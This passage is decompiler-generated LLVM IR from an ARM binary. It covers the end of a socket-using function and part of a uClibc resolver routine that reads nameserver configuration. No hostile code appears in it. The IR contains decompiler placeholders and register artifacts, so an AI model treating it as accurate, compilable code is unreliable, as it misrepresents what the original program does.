  %stack_var_-204.1.ph.be = phi i32 [ %v7_10850, %.thread19 ], [ -1, %dec_label_pc_10b58 ], [ -1, %dec_label_pc_10abc ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_10b60, %dec_label_pc_10b58 ], [ %v1_10ac4, %dec_label_pc_10abc ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_1055c.lr.ph, label %dec_label_pc_10b94

dec_label_pc_10ad4:                               ; preds = %dec_label_pc_109cc
  %v1_10ad4 = inttoptr i32 %v0_109cc to i32*
  %v2_10ad4 = load i32, i32* %v1_10ad4, align 4
  store i32 %v2_10ad4, i32* @r0, align 4
  %v0_10ad8 = call i32 @free()
  br label %dec_label_pc_10adc

dec_label_pc_10adc:                               ; preds = %dec_label_pc_1086c, %dec_label_pc_107c0, %dec_label_pc_108fc, %dec_label_pc_108f0, %dec_label_pc_107d8, %dec_label_pc_107a0, %dec_label_pc_10ad4
  br i1 %v2_10ae0, label %dec_label_pc_10ae8, label %dec_label_pc_10b44

dec_label_pc_10ae8:                               ; preds = %dec_label_pc_10adc
  store i32 %v2_104d8, i32* @r5, align 4
  store i32 %v2_104d8, i32* @r0, align 4
  %v1_10b00 = call i32 @__pthread_return_void()
  %v1_10b10 = call i32 @__pthread_return_0()
  %v2_10b1c = load i32, i32* @global_var_20eb0.702, align 4
  store i32 %v2_104d8, i32* @r0, align 4
  %v1_10b2c = call i32 @__pthread_return_void()
  %v1_10b34 = add i32 %v2_10b1c, -1
  store i32 %v1_10b34, i32* @r4, align 4
  %v5_10b3c = icmp slt i32 %v6_10b3c, %v1_10b34
  br i1 %v5_10b3c, label %.thread27, label %dec_label_pc_10b44

.thread27:                                        ; preds = %dec_label_pc_10ae8
  %v7_10b3c = add i32 %v6_10b3c, 1
  br label %dec_label_pc_10b74.backedge

dec_label_pc_10b44:                               ; preds = %dec_label_pc_10ae8, %dec_label_pc_10adc
  %v0_10b44 = load i32, i32* @sl, align 4
  %v1_10b44 = add i32 %v0_10b44, 1
  %v2_10b4c = srem i32 %v1_10b44, %arg3
  store i32 %v2_10b4c, i32* @sl, align 4
  %v2_10b50 = icmp eq i32 %v2_10b4c, 0
  br i1 %v2_10b50, label %dec_label_pc_10b58, label %dec_label_pc_10b74.backedge

dec_label_pc_10b58:                               ; preds = %dec_label_pc_10b44
  %v1_10b60 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_10b78.outer.backedge

dec_label_pc_10b74.backedge:                      ; preds = %dec_label_pc_10aa8, %dec_label_pc_10b44, %.thread27
  %storemerge87 = phi i32 [ %v7_10b3c, %.thread27 ], [ -1, %dec_label_pc_10b44 ], [ -1, %dec_label_pc_10aa8 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_1055c.lr.ph.preheader, label %dec_label_pc_10b94

dec_label_pc_1055c.lr.ph.preheader:               ; preds = %dec_label_pc_1055c.lr.ph.preheader.lr.ph, %dec_label_pc_10b74.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_1055c.lr.ph.preheader.lr.ph ], [ %v0_1070c, %dec_label_pc_10b74.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_10554, %dec_label_pc_1055c.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_10b74.backedge ]
  %v0_10b74259 = phi i32 [ -1, %dec_label_pc_1055c.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_10b74.backedge ]
  br label %dec_label_pc_1055c.lr.ph

dec_label_pc_1055c.lr.ph:                         ; preds = %dec_label_pc_1055c.lr.ph.preheader, %dec_label_pc_10b78.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_1070c, %dec_label_pc_10b78.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_1055c.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_10b78.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_1055c.lr.ph.preheader ]
  %v6_10b3c = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_10b78.outer.backedge ], [ %v0_10b74259, %dec_label_pc_1055c.lr.ph.preheader ]
  %v1_10604 = icmp slt i32 %v6_10b3c, 0
  %v4_10640 = mul i32 %v6_10b3c, 4
  %v5_10640 = add i32 %v4_10640, ptrtoint (i32* @global_var_20e90.706 to i32)
  %v6_10640 = inttoptr i32 %v5_10640 to i32*
  br label %dec_label_pc_1055c

dec_label_pc_10b88:                               ; preds = %bb195, %.thread8, %dec_label_pc_104b4, %dec_label_pc_104a8
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_10b94

dec_label_pc_10b94:                               ; preds = %dec_label_pc_104c4, %dec_label_pc_10b74.backedge, %dec_label_pc_10b78.outer.backedge, %bb200, %dec_label_pc_1064c, %dec_label_pc_10b78.backedge, %dec_label_pc_10b88
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_10b88 ], [ %v0_1070c, %dec_label_pc_10b78.backedge ], [ %v1_10564, %dec_label_pc_1064c ], [ %v1_10564, %bb200 ], [ %v0_1070c, %dec_label_pc_10b78.outer.backedge ], [ -1, %dec_label_pc_104c4 ], [ %v0_1070c, %dec_label_pc_10b74.backedge ]
  %v0_10b94 = call i32 @__GI___h_errno_location()
  %v2_10b9c = inttoptr i32 %v0_10b94 to i32*
  store i32 -1, i32* %v2_10b9c, align 4
  %v0_10ba0 = load i32, i32* @sb, align 4
  store i32 %v0_10ba0, i32* @r6, align 4
  br label %dec_label_pc_10ba4

dec_label_pc_10ba4:                               ; preds = %dec_label_pc_10890, %dec_label_pc_10b94
  %v1_10bac = phi i32 [ %stack_var_-216.2, %dec_label_pc_10b94 ], [ %v0_1070c, %dec_label_pc_10890 ]
  %v7_10ba8 = icmp eq i32 %v1_10bac, -1
  br i1 %v7_10ba8, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_10ba4
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_10ba4, %bb208
  store i32 68532, i32* @lr, align 4
  %v1_10bb0 = xor i1 %v7_10ba8, true
  call void @__pseudo_cond_branch(i1 %v1_10bb0, i32 ptrtoint (i32* @global_var_a9f4.699 to i32))
  %v2_10bb4 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_10bb4, i32* @r0, align 4
  %v0_10bb8 = call i32 @free()
  %v0_10bbc = load i32, i32* @r7, align 4
  store i32 %v0_10bbc, i32* @r0, align 4
  %v0_10bc0 = call i32 @free()
  %v0_10bc4 = load i32, i32* @sl, align 4
  %v7_10bc4 = icmp eq i32 %v0_10bc4, -1
  br i1 %v7_10bc4, label %bb210, label %dec_label_pc_10bd0

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_10c2c

dec_label_pc_10bd0:                               ; preds = %bb209
  %v2_10bd0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10bd0, i32* @r0, align 4
  %v1_10be8 = call i32 @__pthread_return_void()
  %v1_10bf8 = call i32 @__pthread_return_0()
  %v0_10c04 = load i32, i32* @r6, align 4
  %v3_10c04 = sdiv i32 %v0_10c04, 256
  %v0_10c08 = load i32, i32* @sl, align 4
  store i32 %v0_10c08, i32* @global_var_20e48.694, align 4
  store i32 %v2_10bd0, i32* @r0, align 4
  %v1_10c14 = trunc i32 %v3_10c04 to i8
  store i8 %v1_10c14, i8* @global_var_1e7b1.697, align 1
  %v1_10c18 = trunc i32 %v0_10c04 to i8
  store i8 %v1_10c18, i8* bitcast (i8** @global_var_1e7b0.696 to i8*), align 4
  store i32 68648, i32* @lr, align 4
  %v1_10c24 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10c2c

dec_label_pc_10c2c:                               ; preds = %bb210, %bb207, %dec_label_pc_10bd0
  %v0_10c2c = phi i32 [ %v0_10bc4, %bb210 ], [ %v0_10c2c.pre, %bb207 ], [ -1, %dec_label_pc_10bd0 ]
  store i32 %v3_10460, i32* @r4, align 4
  store i32 %v6_10460, i32* @r5, align 4
  store i32 %v9_10460, i32* @r6, align 4
  store i32 %v12_10460, i32* @r7, align 4
  store i32 %v15_10460, i32* @r8, align 4
  store i32 %v18_10460, i32* @sb, align 4
  store i32 %v21_10460, i32* @sl, align 4
  ret i32 %v0_10c2c

; uselistorder directives
  uselistorder i32 %v0_10c04, { 1, 0 }
  uselistorder i32 %v0_10bc4, { 1, 0 }
  uselistorder i1 %v7_10ba8, { 1, 0 }
  uselistorder i32 %v6_10b3c, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_10a80, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_108d4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_109cc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1098c, { 1, 0 }
  uselistorder i32 %v0_108ac, { 1, 0 }
  uselistorder i32 %v0_108b0, { 1, 0 }
  uselistorder i32 %v5_107b0, { 1, 0 }
  uselistorder i32 %v0_1070c, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_10678, { 1, 0 }
  uselistorder i32 %v2_10618, { 1, 0 }
  uselistorder i32 %v1_10590, { 1, 2, 0 }
  uselistorder i1 %v7_10560, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_10564, { 1, 2, 0 }
  uselistorder i32 %v0_10554, { 1, 0 }
  uselistorder i32 %v2_104d8, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_close, { 0, 1, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_recv, { 1, 0, 2 }
  uselistorder i32 (i32, i32*, i32, i32)* @__libc_send, { 1, 0 }
  uselistorder i32 101, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 (i32, %sockaddr*, i32)* @__libc_connect, { 2, 0, 1 }
  uselistorder i32 ()* @socket, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 4, 3 }
  uselistorder i8* @global_var_1e7b1.697, { 2, 1, 0 }
  uselistorder i32 512, { 3, 4, 2, 5, 1, 6, 7, 8, 9, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_10c2c, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_10ba4, { 1, 0 }
  uselistorder label %dec_label_pc_10b94, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_10b88, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1055c.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10b74.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10adc, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_10b78.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10aa8, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_10a28, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_10a14, { 1, 0 }
  uselistorder label %dec_label_pc_10a00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_109fc, { 1, 0 }
  uselistorder label %dec_label_pc_10964, { 1, 0, 2 }
  uselistorder label %dec_label_pc_108a0, { 1, 0 }
  uselistorder label %dec_label_pc_10890, { 1, 0 }
  uselistorder label %dec_label_pc_10b78.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_106f8, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_1064c, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10c38:
  %v0_10c38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10c38, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10c38
  %v5_10c38 = mul i32 %arg2, 256
  %v6_10c38 = and i32 %v5_10c38, %arg1
  %v3_10c3c = load i32, i32* @lr, align 4
  %v8_10c3c = lshr i32 %v6_10c38, %v3_10c3c
  %v9_10c3c = and i32 %v8_10c3c, %arg3
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10c38, %bb
  %v10_10c68 = phi i32 [ %arg1, %dec_label_pc_10c38 ], [ %v9_10c3c, %bb ]
  ret i32 %v10_10c68

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_10c6c = load i32, i32* @r4, align 4
  store i32 %v3_10c6c, i32* %stack_var_-28, align 4
  %v6_10c6c = load i32, i32* @r5, align 4
  %v9_10c6c = load i32, i32* @r6, align 4
  %v12_10c6c = load i32, i32* @r7, align 4
  %v15_10c6c = load i32, i32* @r8, align 4
  %v18_10c6c = load i32, i32* @sl, align 4
  %v2_10c70 = ptrtoint i32* %stack_var_-192 to i32
  %v2_10c74 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_10c74, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1e7b4.528 to i32), i32* %r2.global-to-local, align 4
  %v1_10c88 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1e7b4.528 to i32), i32* %r0.global-to-local, align 4
  store i32 68764, i32* @lr, align 4
  %v1_10c98 = call i32 @__pthread_return_0()
  store i32 %v1_10c98, i32* %r0.global-to-local, align 4
  %v2_10ca0 = load i32, i32* @global_var_20eac.533, align 4
  %v5_10ca8 = icmp sgt i32 %v2_10ca0, 0
  br i1 %v5_10ca8, label %dec_label_pc_10ee4, label %dec_label_pc_10cac

dec_label_pc_10cac:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_15604.715 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15618.717 to i32), i32* @r1, align 4
  %v3_10cb4 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_15604.715 to i32), i32 ptrtoint (i32* @global_var_15618.717 to i32))
  store i32 %v3_10cb4, i32* %r0.global-to-local, align 4
  store i32 %v3_10cb4, i32* @sl, align 4
  %v2_10cb8 = icmp eq i32 %v3_10cb4, 0
  br i1 %v2_10cb8, label %dec_label_pc_10cc0, label %dec_label_pc_10eac.preheader

dec_label_pc_10cc0:                               ; preds = %dec_label_pc_10cac
  store i32 ptrtoint ([24 x i8]* @global_var_1561c.719 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15618.717 to i32), i32* @r1, align 4
  %v3_10cc8 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1561c.719 to i32), i32 ptrtoint (i32* @global_var_15618.717 to i32))
  store i32 %v3_10cc8, i32* %r0.global-to-local, align 4
  store i32 %v3_10cc8, i32* @sl, align 4
  %v2_10ccc = icmp eq i32 %v3_10cc8, 0
  br i1 %v2_10ccc, label %dec_label_pc_10ed8, label %dec_label_pc_10eac.preheader

dec_label_pc_10eac.preheader:                     ; preds = %dec_label_pc_10cac, %dec_label_pc_10cc0
  %v0_10eb426 = phi i32 [ %v3_10cb4, %dec_label_pc_10cac ], [ %v3_10cc8, %dec_label_pc_10cc0 ]
  %v2_10d20 = ptrtoint i32* %stack_var_-28 to i32
  %v3_10dbc = inttoptr i32 %tmp to i8*
  store i32 %v2_10c70, i32* %r0.global-to-local, align 4
  store i32 %v0_10eb426, i32* %r2.global-to-local, align 4
  %v3_10eb866 = call i32 @fgets(i32 %v2_10c70, i32 128, i32 %v0_10eb426)
  store i32 %v3_10eb866, i32* %r0.global-to-local, align 4
  %v2_10ebc68 = icmp eq i32 %v3_10eb866, 0
  store i32 %v2_10c70, i32* @r4, align 4
  br i1 %v2_10ebc68, label %dec_label_pc_10ecc, label %dec_label_pc_10cdc.preheader.lr.ph

dec_label_pc_10cdc.preheader.lr.ph:               ; preds = %dec_label_pc_10eac.preheader
  %v1_10cdc11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_10cdc.preheader

dec_label_pc_10cd8:                               ; preds = %dec_label_pc_10ce8
  %v1_10cd8 = add i32 %v0_10cd8, 1
  store i32 %v1_10cd8, i32* %r0.global-to-local, align 4
  %v1_10cdc = inttoptr i32 %v1_10cd8 to i8*
  %v2_10cdc = load i8, i8* %v1_10cdc, align 1
  %v3_10cdc = zext i8 %v2_10cdc to i32
  store i32 %v3_10cdc, i32* %r2.global-to-local, align 4
  %v2_10ce0 = icmp eq i8 %v2_10cdc, 0
  br i1 %v2_10ce0, label %dec_label_pc_10cfc, label %dec_label_pc_10ce8

dec_label_pc_10ce8:                               ; preds = %dec_label_pc_10ce8.lr.ph, %dec_label_pc_10cd8
  %v0_10cd8 = phi i32 [ %v2_10c70, %dec_label_pc_10ce8.lr.ph ], [ %v1_10cd8, %dec_label_pc_10cd8 ]
  %v1_10cf0 = phi i32 [ %v3_10cdc13, %dec_label_pc_10ce8.lr.ph ], [ %v3_10cdc, %dec_label_pc_10cd8 ]
  %v3_10cf0 = mul nuw nsw i32 %v1_10cf0, 2
  %v4_10cf0 = add i32 %v3_10cf0, %v2_10cec.pre
  %v5_10cf0 = inttoptr i32 %v4_10cf0 to i8*
  %v6_10cf0 = load i8, i8* %v5_10cf0, align 1
  %v1_10cf4 = and i8 %v6_10cf0, 32
  %v2_10cf4 = icmp eq i8 %v1_10cf4, 0
  br i1 %v2_10cf4, label %dec_label_pc_10cfc, label %dec_label_pc_10cd8

dec_label_pc_10cfc:                               ; preds = %dec_label_pc_10cd8, %dec_label_pc_10ce8, %dec_label_pc_10cdc.preheader
  %v0_10d9435 = phi i32 [ %v2_10c70, %dec_label_pc_10cdc.preheader ], [ %v1_10cd8, %dec_label_pc_10cd8 ], [ %v0_10cd8, %dec_label_pc_10ce8 ]
  %v0_10d10 = phi i32 [ %v3_10cdc13, %dec_label_pc_10cdc.preheader ], [ %v3_10cdc, %dec_label_pc_10cd8 ], [ %v1_10cf0, %dec_label_pc_10ce8 ]
  %v7_10cfc = icmp eq i32 %v0_10d10, 10
  br i1 %v7_10cfc, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_10cfc
  %v3_10d00 = icmp eq i32 %v0_10d10, 0
  br i1 %v3_10d00, label %bb55, label %dec_label_pc_10d10

.thread3:                                         ; preds = %dec_label_pc_10cfc
  br label %dec_label_pc_10eac.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_10eac.backedge

dec_label_pc_10eac.backedge:                      ; preds = %dec_label_pc_10e88, %dec_label_pc_10ea0, %bb55, %dec_label_pc_10e20, %.thread3, %dec_label_pc_10d10
  %v0_10eb4.pre = load i32, i32* @sl, align 4
  store i32 %v2_10c70, i32* %r0.global-to-local, align 4
  store i32 %v0_10eb4.pre, i32* %r2.global-to-local, align 4
  %v3_10eb8 = call i32 @fgets(i32 %v2_10c70, i32 128, i32 %v0_10eb4.pre)
  store i32 %v3_10eb8, i32* %r0.global-to-local, align 4
  %v2_10ebc = icmp eq i32 %v3_10eb8, 0
  store i32 %v2_10c70, i32* @r4, align 4
  br i1 %v2_10ebc, label %dec_label_pc_10ecc, label %dec_label_pc_10cdc.preheader

dec_label_pc_10d10:                               ; preds = %bb
  %v7_10d10 = icmp eq i32 %v0_10d10, 35
  br i1 %v7_10d10, label %dec_label_pc_10eac.backedge, label %dec_label_pc_10d94

dec_label_pc_10d20:                               ; preds = %bb58
  store i32 %v2_10d20, i32* %r2.global-to-local, align 4
  %v4_10d24 = mul i32 %storemerge, 4
  %v5_10d24 = add i32 %v4_10d24, %v2_10d20
  %v2_10d28 = add i32 %v5_10d24, -36
  %v3_10d28 = inttoptr i32 %v2_10d28 to i32*
  store i32 %v0_10d28, i32* %v3_10d28, align 4
  %v0_10d3415 = load i32, i32* %r0.global-to-local, align 4
  %v1_10d3416 = inttoptr i32 %v0_10d3415 to i8*
  %v2_10d3417 = load i8, i8* %v1_10d3416, align 1
  %v3_10d3418 = zext i8 %v2_10d3417 to i32
  store i32 %v3_10d3418, i32* %r2.global-to-local, align 4
  %v2_10d3819 = icmp eq i8 %v2_10d3417, 0
  br i1 %v2_10d3819, label %dec_label_pc_10d68.preheader, label %dec_label_pc_10d40.lr.ph

dec_label_pc_10d40.lr.ph:                         ; preds = %dec_label_pc_10d20
  %v2_10d44.pre = load i32, i32* @global_var_1e7a4, align 4
  br label %dec_label_pc_10d40

dec_label_pc_10d30:                               ; preds = %dec_label_pc_10d54
  %v1_10d30 = add i32 %v0_10d30, 1
  store i32 %v1_10d30, i32* %r0.global-to-local, align 4
  %v1_10d34 = inttoptr i32 %v1_10d30 to i8*
  %v2_10d34 = load i8, i8* %v1_10d34, align 1
  %v3_10d34 = zext i8 %v2_10d34 to i32
  store i32 %v3_10d34, i32* %r2.global-to-local, align 4
  %v2_10d38 = icmp eq i8 %v2_10d34, 0
  br i1 %v2_10d38, label %dec_label_pc_10d68.preheader, label %dec_label_pc_10d40

dec_label_pc_10d40:                               ; preds = %dec_label_pc_10d40.lr.ph, %dec_label_pc_10d30
  %v0_10d30 = phi i32 [ %v0_10d3415, %dec_label_pc_10d40.lr.ph ], [ %v1_10d30, %dec_label_pc_10d30 ]
  %v0_10d54 = phi i32 [ %v3_10d3418, %dec_label_pc_10d40.lr.ph ], [ %v3_10d34, %dec_label_pc_10d30 ]
  %v3_10d48 = mul nuw nsw i32 %v0_10d54, 2
  %v4_10d48 = add i32 %v3_10d48, %v2_10d44.pre
  %v5_10d48 = inttoptr i32 %v4_10d48 to i8*
  %v6_10d48 = load i8, i8* %v5_10d48, align 1
  %v1_10d4c = and i8 %v6_10d48, 32
  %v2_10d4c = icmp eq i8 %v1_10d4c, 0
  br i1 %v2_10d4c, label %dec_label_pc_10d54, label %dec_label_pc_10d68.preheader

dec_label_pc_10d54:                               ; preds = %dec_label_pc_10d40
  %v7_10d54 = icmp eq i32 %v0_10d54, 10
  br i1 %v7_10d54, label %dec_label_pc_10d68.preheader, label %dec_label_pc_10d30

dec_label_pc_10d68.preheader:                     ; preds = %dec_label_pc_10d54, %dec_label_pc_10d40, %dec_label_pc_10d30, %dec_label_pc_10d20
  %v0_10d6820 = phi i32 [ %v0_10d3415, %dec_label_pc_10d20 ], [ %v0_10d30, %dec_label_pc_10d54 ], [ %v0_10d30, %dec_label_pc_10d40 ], [ %v1_10d30, %dec_label_pc_10d30 ]
  %v1_10d6821 = inttoptr i32 %v0_10d6820 to i8*
  %v2_10d6822 = load i8, i8* %v1_10d6821, align 1
  %v3_10d6823 = zext i8 %v2_10d6822 to i32
  store i32 %v3_10d6823, i32* %r2.global-to-local, align 4
  %v2_10d6c24 = icmp eq i8 %v2_10d6822, 0
  br i1 %v2_10d6c24, label %dec_label_pc_10d90, label %dec_label_pc_10d74

dec_label_pc_10d60:                               ; preds = %dec_label_pc_10d74, %dec_label_pc_10d88
  %v3_10d64 = inttoptr i32 %v2_10d64 to i8*
  store i8 0, i8* %v3_10d64, align 1
  %v4_10d64 = load i32, i32* %r0.global-to-local, align 4
  %v5_10d64 = add i32 %v4_10d64, 1
  store i32 %v5_10d64, i32* %r0.global-to-local, align 4
  %v1_10d68 = inttoptr i32 %v5_10d64 to i8*
  %v2_10d68 = load i8, i8* %v1_10d68, align 1
  %v3_10d68 = zext i8 %v2_10d68 to i32
  store i32 %v3_10d68, i32* %r2.global-to-local, align 4
  %v2_10d6c = icmp eq i8 %v2_10d68, 0
  br i1 %v2_10d6c, label %dec_label_pc_10d90, label %dec_label_pc_10d74

dec_label_pc_10d74:                               ; preds = %dec_label_pc_10d68.preheader, %dec_label_pc_10d60
  %v0_10d88 = phi i32 [ %v3_10d68, %dec_label_pc_10d60 ], [ %v3_10d6823, %dec_label_pc_10d68.preheader ]
  %v2_10d64 = phi i32 [ %v5_10d64, %dec_label_pc_10d60 ], [ %v0_10d6820, %dec_label_pc_10d68.preheader ]
  %v2_10d78 = load i32, i32* @global_var_1e7a4, align 4
  %v3_10d7c = mul nuw nsw i32 %v0_10d88, 2
  %v4_10d7c = add i32 %v2_10d78, %v3_10d7c
  %v5_10d7c = inttoptr i32 %v4_10d7c to i8*
  %v6_10d7c = load i8, i8* %v5_10d7c, align 1
  %v1_10d80 = and i8 %v6_10d7c, 32
  %v2_10d80 = icmp eq i8 %v1_10d80, 0
  br i1 %v2_10d80, label %dec_label_pc_10d88, label %dec_label_pc_10d60

dec_label_pc_10d88:                               ; preds = %dec_label_pc_10d74
  %v7_10d88 = icmp eq i32 %v0_10d88, 10
  br i1 %v7_10d88, label %dec_label_pc_10d60, label %dec_label_pc_10d90

dec_label_pc_10d90:                               ; preds = %dec_label_pc_10d60, %dec_label_pc_10d88, %dec_label_pc_10d68.preheader
  %v0_10d9434 = phi i32 [ %v0_10d6820, %dec_label_pc_10d68.preheader ], [ %v5_10d64, %dec_label_pc_10d60 ], [ %v2_10d64, %dec_label_pc_10d88 ]
  %v0_10d90 = load i32, i32* @r8, align 4
  %v1_10d90 = add i32 %v0_10d90, 1
  br label %dec_label_pc_10d94

dec_label_pc_10d94:                               ; preds = %dec_label_pc_10d10, %dec_label_pc_10d90
  %storemerge = phi i32 [ %v1_10d90, %dec_label_pc_10d90 ], [ 0, %dec_label_pc_10d10 ]
  %v0_10d28 = phi i32 [ %v0_10d9434, %dec_label_pc_10d90 ], [ %v0_10d9435, %dec_label_pc_10d10 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_10d94 = inttoptr i32 %v0_10d28 to i8*
  %v2_10d94 = load i8, i8* %v1_10d94, align 1
  %v3_10d94 = zext i8 %v2_10d94 to i32
  %v2_10d98 = icmp eq i8 %v2_10d94, 0
  br i1 %v2_10d98, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_10d94
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_10d94, %bb56
  %v0_10da8.pr = phi i32 [ %v3_10d94, %dec_label_pc_10d94 ], [ 1, %bb56 ]
  %v1_10da0 = add i32 %storemerge, -4
  %v3_10da0 = sub i32 3, %storemerge
  %v4_10da0 = and i32 %v3_10da0, %storemerge
  %v5_10da0 = icmp slt i32 %v4_10da0, 0
  %v6_10da0 = icmp slt i32 %v1_10da0, 0
  %v7_10da0 = icmp eq i32 %storemerge, 4
  %v3_10da4 = xor i1 %v6_10da0, %v5_10da0
  %v4_10da4 = or i1 %v7_10da0, %v3_10da4
  br i1 %v4_10da4, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_10db0

bb58:                                             ; preds = %bb57
  %v2_10da8 = icmp eq i32 %v0_10da8.pr, 0
  br i1 %v2_10da8, label %dec_label_pc_10db0, label %dec_label_pc_10d20

dec_label_pc_10db0:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_15634.722 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_10dbc = call i32 @__GI_strcoll(i8* %v3_10dbc, i32 ptrtoint ([11 x i8]* @global_var_15634.722 to i32))
  store i32 %v4_10dbc, i32* %r0.global-to-local, align 4
  %v2_10dc0 = icmp eq i32 %v4_10dbc, 0
  br i1 %v2_10dc0, label %dec_label_pc_10de8.preheader, label %dec_label_pc_10e0c

dec_label_pc_10de8.preheader:                     ; preds = %dec_label_pc_10db0
  br label %dec_label_pc_10de8

dec_label_pc_10dd0:                               ; preds = %dec_label_pc_10e00
  %v1_10dd0 = add i32 %v5_10df0, -36
  %v2_10dd0 = inttoptr i32 %v1_10dd0 to i32*
  %v3_10dd0 = load i32, i32* %v2_10dd0, align 4
  store i32 %v3_10dd0, i32* %r0.global-to-local, align 4
  %v1_10dd4 = inttoptr i32 %v3_10dd0 to i8*
  %v2_10dd4 = call i32 @__GI_strdup(i8* %v1_10dd4)
  store i32 %v2_10dd4, i32* %r0.global-to-local, align 4
  %v0_10ddc = load i32, i32* @r4, align 4
  %v1_10ddc = add i32 %v0_10ddc, 1
  store i32 %v1_10ddc, i32* %r2.global-to-local, align 4
  %v5_10de0 = mul i32 %v0_10ddc, 4
  %v6_10de0 = add i32 %v5_10de0, ptrtoint (i32* @global_var_20ea0.536 to i32)
